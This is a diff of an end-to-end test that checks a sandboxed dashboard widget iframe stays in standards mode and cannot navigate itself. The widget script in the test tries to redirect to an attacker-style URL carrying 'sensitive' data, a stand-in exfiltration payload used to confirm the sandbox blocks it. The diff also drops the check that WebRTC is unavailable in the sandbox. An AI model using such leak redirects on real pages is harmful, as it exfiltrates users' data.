@@ -119,7 +119,7 @@ describeControlUiE2e("Control UI session dashboard stitch", () => {
     await server?.close();
   });
 
-  it("keeps guarded widget documents in standards mode and cancels self-navigation", async () => {
+  it("keeps widget documents in standards mode and cancels self-navigation", async () => {
     const sandboxHost = createSandboxHostHttpServer();
     await new Promise<void>((resolve, reject) => {
       sandboxHost.once("error", reject);
@@ -164,7 +164,6 @@ describeControlUiE2e("Control UI session dashboard stitch", () => {
       const widgetHtml = `<!doctype html><html><body><script>
         parent.postMessage({
           compatMode: document.compatMode,
-          peerConnection: typeof globalThis.RTCPeerConnection,
         }, "*");
         setTimeout(() => {
           location.href = "https://attacker.invalid/leak?value=sensitive";
@@ -185,12 +184,11 @@ describeControlUiE2e("Control UI session dashboard stitch", () => {
             (
               Reflect.get(globalThis, "widgetProbes") as Array<{
                 compatMode?: string;
-                peerConnection?: string;
               }>
             ).filter((probe) => probe?.compatMode),
           ),
         )
-        .toEqual([{ compatMode: "CSS1Compat", peerConnection: "undefined" }]);
+        .toEqual([{ compatMode: "CSS1Compat" }]);
       const sandboxFrame = await page
         .locator("iframe")
         .elementHandle()
